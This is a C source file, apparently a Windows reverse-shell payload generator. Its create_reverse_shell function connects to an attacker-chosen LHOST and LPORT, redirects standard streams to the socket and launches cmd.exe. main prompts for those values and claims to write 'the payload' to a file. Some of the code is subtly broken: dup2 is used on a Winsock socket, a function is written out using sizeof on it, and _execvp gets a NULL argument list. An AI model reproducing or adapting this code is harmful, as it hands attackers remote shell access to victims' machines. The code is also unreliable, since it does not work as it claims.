#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib (Windows Socket Library)

void create_reverse_shell(const char *lhost, int lport) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed\n");
        return;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        WSACleanup();
        return;
    }

    // Set up server address
    server.sin_family = AF_INET;
    server.sin_port = htons(lport);
    server.sin_addr.s_addr = inet_addr(lhost);

    // Connect to the server (LHOST: LPORT)
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Redirect standard input/output/error to the socket
    dup2((int)sock, 0);  // stdin
    dup2((int)sock, 1);  // stdout
    dup2((int)sock, 2);  // stderr

    // Execute the command shell (cmd.exe)
    _execvp("cmd.exe", NULL);

    // Cleanup
    closesocket(sock);
    WSACleanup();
}

int main() {
    char lhost[100], output_file[100];
    int lport;

    // Get LHOST
    printf("ENTER LHOST: ");
    fgets(lhost, sizeof(lhost), stdin);
    lhost[strcspn(lhost, "\n")] = 0;  // Remove newline character

    // Get LPORT
    printf("ENTER LPORT: ");
    scanf("%d", &lport);
    getchar();  // Consume the newline character left by scanf

    // Get OUTPUT file
    printf("ENTER OUTPUT: ");
    fgets(output_file, sizeof(output_file), stdin);
    output_file[strcspn(output_file, "\n")] = 0;  // Remove newline character

    // Generate reverse shell and save it to output file
    FILE *f = fopen(output_file, "wb");
    if (f == NULL) {
        printf("Unable to open file for writing\n");
        return 1;
    }

    // Write the payload to the file
    fwrite((void *)create_reverse_shell, sizeof(create_reverse_shell), 1, f);
    fclose(f);

    printf("[*] Payload saved to '%s' with LHOST %s and LPORT %d!\n", output_file, lhost, lport);

    return 0;
}
